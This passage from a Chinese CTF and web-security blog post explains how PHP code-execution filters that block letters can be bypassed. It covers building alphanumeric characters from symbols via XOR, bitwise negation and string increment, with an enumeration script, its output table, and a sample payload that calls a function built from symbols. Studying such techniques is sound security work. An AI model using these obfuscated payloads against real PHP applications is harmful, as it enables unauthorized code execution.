+<p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符</p>
+<p><strong>异或</strong></p>
+<p>任何字母与0异或，最后得到的都是它本身。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;~!@#$%^&amp;*()_+\|/?.,&lt;&gt;`-={}[]&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">64</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">&lt;</span><span class="mi">91</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;xor&#39;</span><span class="o">.</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;is &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">96</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="o">&lt;</span><span class="mi">122</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;xor&#39;</span><span class="o">.</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;is &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果：</p>
+<pre class="wp-block-code"><code>~xor$is Z 90
+~xor&is X 88
+~xor*is T 84
+~xor(is V 86
+~xor)is W 87
+~xor+is U 85
+~xor/is Q 81
+~xor?is A 65
+~xor.is P 80
+~xor,is R 82
+~xor&lt;is B 66
+~xor-is S 83
+~xor=is C 67
+!xor@is a 97
+!xor`is A 65
+!xor{is Z 90
+@xor!is a 97
+@xor#is c 99
+@xor$is d 100
+@xor%is e 101
+@xor&is f 102
+@xor*is j 106
+@xor(is h 104
+@xor)is i 105
+@xor+is k 107
+@xor/is o 111
+@xor.is n 110
+@xor,is l 108
+@xor-is m 109
+#xor@is c 99
+#xor`is C 67
+#xor{is X 88
+#xor&#91;is x 120
+$xor~is Z 90
+$xor@is d 100
+$xor\is x 120
+$xor|is X 88
+$xor`is D 68
+$xor}is Y 89
+$xor]is y 121
+%xor@is e 101
+%xor\is y 121
+%xor|is Y 89
+%xor`is E 69
+%xor}is X 88
+%xor]is x 120
+^xor&is x 120
+^xor*is t 116
+^xor(is v 118
+^xor)is w 119
+^xor+is u 117
+^xor/is q 113
+^xor?is a 97
+^xor.is p 112
+^xor,is r 114
+^xor&lt;is b 98
+^xor-is s 115
+^xor=is c 99
+&xor~is X 88
+&xor@is f 102
+&xor^is x 120
+&xor_is y 121
+&xor|is Z 90
+&xor`is F 70
+*xor~is T 84
+*xor@is j 106
+*xor^is t 116
+*xor_is u 117
+*xor\is v 118
+*xor|is V 86
+*xor`is J 74
+*xor{is Q 81
+*xor}is W 87
+*xor&#91;is q 113
+*xor]is w 119
+(xor~is V 86
+(xor@is h 104
+(xor^is v 118
+(xor_is w 119
+(xor\is t 116
+(xor|is T 84
+(xor`is H 72
+(xor{is S 83
+(xor}is U 85
+(xor&#91;is s 115
+(xor]is u 117
+)xor~is W 87
+)xor@is i 105
+)xor^is w 119
+)xor_is v 118
+)xor\is u 117
+)xor|is U 85
+)xor`is I 73
+)xor{is R 82
+)xor}is T 84
+)xor&#91;is r 114
+)xor]is t 116
+_xor&is y 121
+_xor*is u 117
+_xor(is w 119
+_xor)is v 118
+_xor+is t 116
+_xor/is p 112
+_xor.is q 113
+_xor,is s 115
+_xor&lt;is c 99
+_xor>is a 97
+_xor-is r 114
+_xor=is b 98
++xor~is U 85
++xor@is k 107
++xor^is u 117
++xor_is t 116
++xor\is w 119
++xor|is W 87
++xor`is K 75
++xor{is P 80
++xor}is V 86
++xor&#91;is p 112
++xor]is v 118
+\xor$is x 120
+\xor%is y 121
+\xor*is v 118
+\xor(is t 116
+\xor)is u 117
+\xor+is w 119
+\xor/is s 115
+\xor?is c 99
+\xor.is r 114
+\xor,is p 112
+\xor>is b 98
+\xor-is q 113
+\xor=is a 97
+|xor$is X 88
+|xor%is Y 89
+|xor&is Z 90
+|xor*is V 86
+|xor(is T 84
+|xor)is U 85
+|xor+is W 87
+|xor/is S 83
+|xor?is C 67
+|xor.is R 82
+|xor,is P 80
+|xor>is B 66
+|xor-is Q 81
+|xor=is A 65
+/xor~is Q 81
+/xor@is o 111
+/xor^is q 113
+/xor_is p 112
+/xor\is s 115
+/xor|is S 83
+/xor`is O 79
+/xor{is T 84
+/xor}is R 82
+/xor&#91;is t 116
+/xor]is r 114
+?xor~is A 65
+?xor^is a 97
+?xor\is c 99
+?xor|is C 67
+?xor{is D 68
+?xor}is B 66
+?xor&#91;is d 100
+?xor]is b 98
+.xor~is P 80
+.xor@is n 110
+.xor^is p 112
+.xor_is q 113
+.xor\is r 114
+.xor|is R 82
+.xor`is N 78
+.xor{is U 85
+.xor}is S 83
+.xor&#91;is u 117
+.xor]is s 115
+,xor~is R 82
+,xor@is l 108
+,xor^is r 114
+,xor_is s 115
+,xor\is p 112
+,xor|is P 80
+,xor`is L 76
+,xor{is W 87
+,xor}is Q 81
+,xor&#91;is w 119
+,xor]is q 113
+&lt;xor~is B 66
+&lt;xor^is b 98
+&lt;xor_is c 99
+&lt;xor{is G 71
+&lt;xor}is A 65
+&lt;xor&#91;is g 103
+&lt;xor]is a 97
+>xor_is a 97
+>xor\is b 98
+>xor|is B 66
+>xor{is E 69
+>xor}is C 67
+>xor&#91;is e 101
+>xor]is c 99
+`xor!is A 65
+`xor#is C 67
+`xor$is D 68
+`xor%is E 69
+`xor&is F 70
+`xor*is J 74
+`xor(is H 72
+`xor)is I 73
+`xor+is K 75
+`xor/is O 79
+`xor.is N 78
+`xor,is L 76
+`xor-is M 77
+-xor~is S 83
+-xor@is m 109
+-xor^is s 115
+-xor_is r 114
+-xor\is q 113
+-xor|is Q 81
+-xor`is M 77
+-xor{is V 86
+-xor}is P 80
+-xor&#91;is v 118
+-xor]is p 112
+=xor~is C 67
+=xor^is c 99
+=xor_is b 98
+=xor\is a 97
+=xor|is A 65
+=xor{is F 70
+=xor&#91;is f 102
+{xor!is Z 90
+{xor#is X 88
+{xor*is Q 81
+{xor(is S 83
+{xor)is R 82
+{xor+is P 80
+{xor/is T 84
+{xor?is D 68
+{xor.is U 85
+{xor,is W 87
+{xor&lt;is G 71
+{xor>is E 69
+{xor-is V 86
+{xor=is F 70
+}xor$is Y 89
+}xor%is X 88
+}xor*is W 87
+}xor(is U 85
+}xor)is T 84
+}xor+is V 86
+}xor/is R 82
+}xor?is B 66
+}xor.is S 83
+}xor,is Q 81
+}xor&lt;is A 65
+}xor>is C 67
+}xor-is P 80
+&#91;xor#is x 120
+&#91;xor*is q 113
+&#91;xor(is s 115
+&#91;xor)is r 114
+&#91;xor+is p 112
+&#91;xor/is t 116
+&#91;xor?is d 100
+&#91;xor.is u 117
+&#91;xor,is w 119
+&#91;xor&lt;is g 103
+&#91;xor>is e 101
+&#91;xor-is v 118
+&#91;xor=is f 102
+]xor$is y 121
+]xor%is x 120
+]xor*is w 119
+]xor(is u 117
+]xor)is t 116
+]xor+is v 118
+]xor/is r 114
+]xor?is b 98
+]xor.is s 115
+]xor,is q 113
+]xor&lt;is a 97
+]xor>is c 99
+]xor-is p 112</code></pre>
+<p>&lsquo;[@][&rsquo;^&rsquo;=,&laquo;&lsquo;得到flag字符。利用$_= &lsquo;[@][&rsquo;^&rsquo;=,&laquo;&rsquo; ;$_();能够执行函数。</p>
+<p><strong>取反</strong></p>
+<p>和的url编码为<code>%e5%92%8c</code>。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="382" height="302" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-165.png" alt="" class="wp-image-2863" /> </figure></p>
+<p><strong>自增</strong><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="550" height="227" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-166.png" alt="" class="wp-image-2864" /> </figure></p>
+<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = 'Z'; $a++;</code> 将把 <code>$a</code> 变成<code>'AA'</code>，而在 C 中，<code>a = 'Z'; a++;</code> 将把 <code>a</code> 变成 <code>'['</code>（<code>'Z'</code> 的 ASCII 值是 90，<code>'['</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</p>
+<p>提供了一种思路，利用其他方式获取一个字母后，能通过以上操作得出其他字母。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-03-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛代码/命令执行学习笔记" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛代码/命令执行学习笔记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛代码/命令执行学习笔记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛代码/命令执行学习笔记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/" class="prev" rel="prev" title="攻防世界web高手篇（001-010）"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>攻防世界web高手篇（001-010）</a>
+            <a href="/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/" class="next" rel="next" title="XSS弹窗挑战">XSS弹窗挑战<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
